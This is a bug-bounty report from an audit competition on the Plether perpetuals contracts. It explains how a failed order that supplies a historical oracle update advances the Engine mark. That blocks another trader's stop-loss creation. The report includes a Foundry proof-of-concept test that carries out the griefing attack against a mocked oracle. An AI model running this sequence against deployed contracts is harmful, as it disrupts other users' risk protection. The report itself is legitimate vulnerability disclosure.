# \#99642 [SC-Low] A failed historical order blocks another trader from arming stop-loss protection

**Submitted on Nov 14th 2026 at 15:54:28 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99642
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
At the Plether competition revision `a82d4fef`, Mallory can use her own funded account to make Alice’s otherwise valid protection transaction revert. Alice has an open position and is about to create a stop-loss. Mallory commits a LONG order with a nonzero target price that no valid fill can reach, then executes it with a valid post-commit Pyth update. The Router installs the historical price as the Engine mark before it checks Mallory’s slippage. Her order fails, but the Engine mark remains newer than the Oracle’s accepted live basket. Alice’s protection call then reverts `PriceOutOfOrder`. Mallory opens no position and recovers her reserved USDG; the observed harm is failed protection management and the gas Alice spends on the reverted call.

## Vulnerability Details
The PoC starts with Alice’s funded position, a valid accepted live basket, and an Engine mark at the same timestamp. A control call creates Alice’s protection successfully. Mallory has separate collateral. Order admission requires a nonzero target price, so she commits a LONG open with `targetPrice = type(uint256).max`. The target is valid at commitment but guarantees the later execution price will fail the LONG-open slippage check (`packages/perps/src/router/OrderLiquidationBatchLogic.sol:279-281`; `packages/perps/src/libraries/OrderValidationLib.sol:60-73`).

Mallory calls the permissionless `OrderRouter.executeOrder` with a signed historical update whose publication time follows her commitment. `PletherOracle._resolveHistoricalOrderBasket` parses that unique post-commit basket and synchronizes Pyth’s stored feeds. It does **not** write `_acceptedPrices` or `_acceptedBasket`, which are updated only by the live current-basket path (`packages/perps/src/PletherOracle.sol:596-627,749-800`). The Router’s `_prepareSingleOracle` then calls `_updateEngineMark` for the newer neutral price **before** it invokes the isolated order item (`packages/perps/src/OrderRouterExecutionSidecar.sol:209-231,972-979,1053-1060`). The item checks slippage and settles Mallory’s order as terminal `Slippage`. That item failure does not revert the earlier Engine mark update. Mallory’s margin reservation and execution bounty return to her account; she has no open position.

Alice’s `createPositionProtection` requires a fresh observation. `PositionProtectionBook._freshProtectionObservation` reads the Engine’s fresh mark, then calls `PletherOracle.getLatestPrice(MarkRefresh)`. This view rebuilds a price from the older accepted live basket. `_snapshotFromBasket` rejects its timestamp because it is below `engine.lastMarkTime()` (`packages/perps/src/PositionProtectionBook.sol:862-885`; `packages/perps/src/PletherOracle.sol:706-727,878-903`). The Book’s later check would permit an accepted basket behind the Engine, but execution never reaches it. A signed live `updateMarkPrice` catches the basket up and lets Alice create protection in the same block timestamp; replaying the old cache cannot repair the gap.

## Impact Details
Mallory can interrupt another trader’s stop-loss or take-profit setup without taking market risk or losing USDG collateral. Alice’s transaction reverts and consumes gas, and her requested protection remains unarmed until a separate signed mark refresh and retry. For replacement, the existing protection remains in force instead of Alice’s requested new limits. Mallory pays execution gas and the real Pyth update fee. The demonstrated effect is cross-account risk-management griefing, not a forced liquidation or transfer of Alice’s funds.


## Proof of Concept

## Proof of Concept
```sh
forge test --root packages/perps --match-path 'test/poc/Oracle_NoFillProtectionGap.t.sol' --offline --out out-nofill-protection-gap-skeptic --cache-path cache-nofill-protection-gap-skeptic -vv
```

The test first proves Alice can create protection in the synchronized control state. It then asserts Mallory’s order ends in terminal `Slippage`, her position remains zero, and her Clearinghouse USDG balance returns to its pre-commit value. Despite that failed trade, `engine.lastMarkTime()` exceeds the Oracle’s accepted-basket time and Alice’s creation call reverts with the exact `PriceOutOfOrder` arguments. A signed live refresh makes the same call succeed without advancing the block timestamp. The targeted Foundry run passed **1/1** using the repository’s MockPyth fixture.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {OrderRouterTestBase} from "../perps/shared/OrderRouterTestBase.sol";

/// @notice Historical oracle preparation advances the Engine mark even when the order fails slippage.
///         The failed order takes no position risk but leaves protection's accepted live basket behind.
contract Oracle_NoFillProtectionGap is OrderRouterTestBase {
    address internal attacker = address(0x333);

    function _protectionParams()
        internal
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = 90_000_000;
        params.stopLossTriggerPrice = 110_000_000;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _livePayload(uint256 price) internal returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _prepare() internal {
        settlementToken.mint(attacker, 10_000e6);
        vm.startPrank(attacker);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(attacker, 10_000e6);
        vm.stopPrank();

        vm.prank(alice);
        uint64 aliceOrder = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 1000e6, 1, false);
        bytes[] memory historical = _mockPythUpdateData();
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.ExecutionResult memory opened = router.executeOrder(aliceOrder, historical);
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed));

        vm.warp(vm.getBlockTimestamp() + 5);
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_livePayload(1e8));
        (bool accepted,, uint64 acceptedTime) = router.pletherOracle().getAcceptedBasketMark();
        assertTrue(accepted);
        assertEq(engine.lastMarkTime(), acceptedTime, "pre-attack marks synchronized");
    }

    function test_TerminalSlippageAdvancesMarkWithoutFillAndBlocksOtherTradersProtection() public {
        _prepare();
        IPositionProtectionActions actions = IPositionProtectionActions(address(router.positionProtectionBook()));

        uint256 control = vm.snapshotState();
        vm.prank(alice);
        assertGt(actions.createPositionProtection(_protectionParams()), 0, "control protection works");
        assertTrue(vm.revertToState(control));

        uint256 attackerBalanceBefore = clearinghouse.balanceAssets(attacker);
        (uint256 attackerSizeBefore,,,,,,) = engine.positions(attacker);
        assertEq(attackerSizeBefore, 0);

        // LONG opens require fill >= target. The nonzero, impossible target is accepted at commit.
        vm.prank(attacker);
        uint64 doomedOrder = router.commitOrder(
            CfdTypes.Side.LONG, 1_000e18, 100e6, type(uint256).max, false
        );
        bytes[] memory signedHistorical = _mockPythUpdateData();
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(attacker); // self-execution returns the reserved bounty to the same account
        OrderV3Types.ExecutionResult memory failed = router.executeOrder(doomedOrder, signedHistorical);
        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.Slippage));
        (uint256 attackerSizeAfter,,,,,,) = engine.positions(attacker);
        assertEq(attackerSizeAfter, 0, "no attacker position or price risk");
        assertEq(clearinghouse.balanceAssets(attacker), attackerBalanceBefore, "margin and bounty returned");

        (bool accepted,, uint64 acceptedTime) = router.pletherOracle().getAcceptedBasketMark();
        uint64 engineTime = engine.lastMarkTime();
        assertTrue(accepted);
        assertGt(engineTime, acceptedTime, "failed order advanced Engine only");

        vm.prank(alice);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, engineTime)
        );
        actions.createPositionProtection(_protectionParams());

        // A signed current basket repairs the state in the same timestamp.
        uint256 repairTime = vm.getBlockTimestamp();
        router.updateMarkPrice(_livePayload(1e8));
        assertEq(vm.getBlockTimestamp(), repairTime);
        vm.prank(alice);
        assertGt(actions.createPositionProtection(_protectionParams()), 0, "protection works after refresh");
    }
}
```
